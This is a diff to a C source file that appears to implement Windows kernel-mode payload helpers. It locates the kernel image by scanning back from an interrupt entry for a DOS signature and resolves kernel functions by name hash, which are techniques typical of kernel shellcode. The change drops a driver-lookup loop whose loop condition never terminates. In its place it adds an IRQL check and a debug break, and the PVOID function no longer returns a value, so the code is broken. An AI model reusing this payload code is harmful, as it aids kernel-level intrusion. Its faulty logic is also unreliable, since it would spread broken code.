@@ -23,6 +23,8 @@
  * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
  * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
+#include <ntstatus.h>
+#include <winternl.h>
 #include "payload_util.h"
 #include "hs_util.h"
 #include "pe_util.h"
@@ -97,11 +99,9 @@ PVOID GetPeBase(DWORD DrvHsh)
     ((ULONG32)InterruptEntryTop << 16) +
     InterruptEntryLow);
 #endif
-  struct Functions           FuncTable  = { 0 };
-  ULONG                      MemStSize  = 0;
-  DWORD                      StringHsh  = 0;
-  PSYSTEM_MODULE_INFORMATION ModuleList = 0;
-  PSYSTEM_MODULE_ENTRY       ModuleFile = 0;
+  struct Functions           FuncTable   = { 0 };
+  ULONG                      StructSize  = 0;
+  DWORD                      StringHsh   = 0;
 
   InterruptEntryPtr = (PVOID)(((ULONG_PTR)InterruptEntryPtr) &~ 0xfff);
   while ( (*(UINT16 *)InterruptEntryPtr) != IMAGE_DOS_SIGNATURE )
@@ -127,27 +127,17 @@ PVOID GetPeBase(DWORD DrvHsh)
     GetPeFunc(InterruptEntryPtr, HASH_EXALLOCATEPOOL);
   FuncTable.ExFreePool =
     GetPeFunc(InterruptEntryPtr, HASH_EXFREEPOOL);
+  FuncTable.KeGetCurrentIrql = 
+    GetPeFunc(InterruptEntryPtr, HASH_KEGETCURRENTIRQL);
+  FuncTable.KeLowerIrql      =
+    GetPeFunc(InterruptEntryPtr, HASH_KELOWERIRQL);
 
-  FuncTable.ZwQuerySystemInformation
-  (SystemModuleInformation, &MemStSize, 0, &MemStSize);
-  ModuleList = FuncTable.ExAllocatePool(PagedPool, MemStSize);
-  FuncTable.ZwQuerySystemInformation
-  (SystemModuleInformation, ModuleList, MemStSize, &MemStSize);
-
-  ModuleFile = ModuleList->Module;
-  for ( int i = 0 ; ModuleList->Count ; i++ )
+  if ( FuncTable.KeGetCurrentIrql() == 0 )
   {
-    StringHsh = HashStringDjb2(
-     (PCHAR)(ModuleFile[i].FullPathName + ModuleFile[i].OffsetToFileName), 0
-    );
-    if ( StringHsh == DrvHsh )
-      return ModuleFile[i].ImageBase;
+    if (
+      FuncTable.ZwQuerySystemInformation(0x0b, &StructSize, 0, &StructSize) != STATUS_ACCESS_VIOLATION )
+    { __debugbreak(); };
   };
-
-  if ( ModuleList != NULL )
-    FuncTable.ExFreePool(ModuleList);
-
-  return NULL;
 };
 #else
 #error Please supply either _KM_UTILS or _UM_UTILS.
